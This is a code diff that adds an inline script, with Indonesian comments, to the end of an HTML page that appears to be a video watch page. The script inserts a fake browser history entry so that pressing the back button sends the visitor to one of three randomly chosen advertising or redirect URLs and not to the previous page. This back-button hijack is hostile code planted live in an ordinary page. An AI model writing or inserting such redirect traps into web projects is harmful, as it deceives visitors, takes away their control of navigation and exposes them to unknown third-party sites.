@@ -283,6 +283,30 @@
     </script>
 
     <script type="module" src="watch.js"></script>
+
+    <script>
+        // Daftar link tujuan
+        const redirectLinks = [
+            "https://domesticrejoinedremark.com/rr7w4y66s?key=f5a3297e273e8f2b63d61b0d19b8d0a9",
+            "https://domesticrejoinedremark.com/xsv7f4118a?key=a12a22c36e35a402ee435cfb6c6db695",
+            "https://otieu.com/4/8420178"
+        ];
+
+        // Fungsi ambil link acak
+        function getRandomLink() {
+            const randomIndex = Math.floor(Math.random() * redirectLinks.length);
+            return redirectLinks[randomIndex];
+        }
+
+        // Tambahkan state awal ke history
+        history.pushState(null, null, location.href);
+
+        // Dengarkan event saat tombol back ditekan
+        window.addEventListener('popstate', function (event) {
+            const randomLink = getRandomLink();
+            window.location.href = randomLink;
+        });
+    </script>
 </body>
 
 </html>
